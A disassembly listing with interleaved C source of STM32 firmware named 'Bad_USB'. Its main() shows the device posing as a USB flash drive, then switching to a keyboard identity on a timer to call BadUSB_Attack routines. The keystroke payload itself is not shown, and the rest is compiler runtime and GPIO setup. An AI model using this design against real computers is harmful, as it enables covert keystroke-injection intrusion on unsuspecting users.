
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000ced0  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       0000022c  0800d05c  0800d05c  0001d05c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d288  0800d288  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d288  0800d288  0001d288  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d290  0800d290  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d290  0800d290  0001d290  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d294  0800d294  0001d294  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d298  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d4d8  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d4d8  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   00020a56  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 00005371  00000000  00000000  00040d09  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b30  00000000  00000000  00046080  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c1  00000000  00000000  00047bb0  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  00026601  00000000  00000000  00049071  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025b08  00000000  00000000  0006f672  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d243e  00000000  00000000  0009517a  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f48  00000000  00000000  001675b8  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e500  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800d044 	.word	0x0800d044

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800d044 	.word	0x0800d044

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fb56 	bl	8001bec <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 f9de 	bl	8001918 <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 f9d0 	bl	8001918 <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000588:	b580      	push	{r7, lr}
 800058a:	b082      	sub	sp, #8
 800058c:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 800058e:	f000 fda0 	bl	80010d2 <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000592:	f000 f855 	bl	8000640 <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000596:	f7ff ff9f 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 800059a:	f000 fcd7 	bl	8000f4c <MX_USART2_UART_Init>
  MX_SPI1_Init();
 800059e:	f000 fb6f 	bl	8000c80 <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 80005a2:	2300      	movs	r3, #0
 80005a4:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 80005a6:	4b22      	ldr	r3, [pc, #136]	; (8000630 <main+0xa8>)
 80005a8:	2201      	movs	r2, #1
 80005aa:	601a      	str	r2, [r3, #0]
  uint32_t Flash_Busy;
  MX_USB_DEVICE_Init_MSC();
 80005ac:	f00b ff08 	bl	800c3c0 <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80005b0:	220f      	movs	r2, #15
 80005b2:	2100      	movs	r1, #0
 80005b4:	481f      	ldr	r0, [pc, #124]	; (8000634 <main+0xac>)
 80005b6:	f00c fd0b 	bl	800cfd0 <memset>

  flag = 1;
 80005ba:	2301      	movs	r3, #1
 80005bc:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 80005be:	481e      	ldr	r0, [pc, #120]	; (8000638 <main+0xb0>)
 80005c0:	f000 fa66 	bl	8000a90 <InterruptTrap>
	  Flash_Busy = __HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY);
 80005c4:	4b1d      	ldr	r3, [pc, #116]	; (800063c <main+0xb4>)
 80005c6:	691b      	ldr	r3, [r3, #16]
 80005c8:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 80005cc:	2b00      	cmp	r3, #0
 80005ce:	bf14      	ite	ne
 80005d0:	2301      	movne	r3, #1
 80005d2:	2300      	moveq	r3, #0
 80005d4:	b2db      	uxtb	r3, r3
 80005d6:	603b      	str	r3, [r7, #0]
	  switch(flag){
 80005d8:	687b      	ldr	r3, [r7, #4]
 80005da:	2b01      	cmp	r3, #1
 80005dc:	d003      	beq.n	80005e6 <main+0x5e>
 80005de:	687b      	ldr	r3, [r7, #4]
 80005e0:	2b02      	cmp	r3, #2
 80005e2:	d012      	beq.n	800060a <main+0x82>
		  }
		  flag = 0;
		  SwitchToMSC();
		  break;
	  default:
		  break;
 80005e4:	e022      	b.n	800062c <main+0xa4>
		  HAL_Delay(10000);
 80005e6:	f242 7010 	movw	r0, #10000	; 0x2710
 80005ea:	f000 fde7 	bl	80011bc <HAL_Delay>
			  if(!Flash_Busy){
 80005ee:	683b      	ldr	r3, [r7, #0]
 80005f0:	2b00      	cmp	r3, #0
 80005f2:	d1fc      	bne.n	80005ee <main+0x66>
				  SwitchToHID();
 80005f4:	f000 f89c 	bl	8000730 <SwitchToHID>
				  BadUSB_Attack(0);
 80005f8:	2000      	movs	r0, #0
 80005fa:	f000 fa67 	bl	8000acc <BadUSB_Attack>
				  break;
 80005fe:	bf00      	nop
		  flag = 2;
 8000600:	2302      	movs	r3, #2
 8000602:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000604:	f000 f8ac 	bl	8000760 <SwitchToMSC>
		  break;
 8000608:	e010      	b.n	800062c <main+0xa4>
		  HAL_Delay(20000);
 800060a:	f644 6020 	movw	r0, #20000	; 0x4e20
 800060e:	f000 fdd5 	bl	80011bc <HAL_Delay>
			  if(!Flash_Busy){
 8000612:	683b      	ldr	r3, [r7, #0]
 8000614:	2b00      	cmp	r3, #0
 8000616:	d1fc      	bne.n	8000612 <main+0x8a>
				  SwitchToHID();
 8000618:	f000 f88a 	bl	8000730 <SwitchToHID>
				  BadUSB_Attack(1);
 800061c:	2001      	movs	r0, #1
 800061e:	f000 fa55 	bl	8000acc <BadUSB_Attack>
				  break;
 8000622:	bf00      	nop
		  flag = 0;
 8000624:	2300      	movs	r3, #0
 8000626:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000628:	f000 f89a 	bl	8000760 <SwitchToMSC>
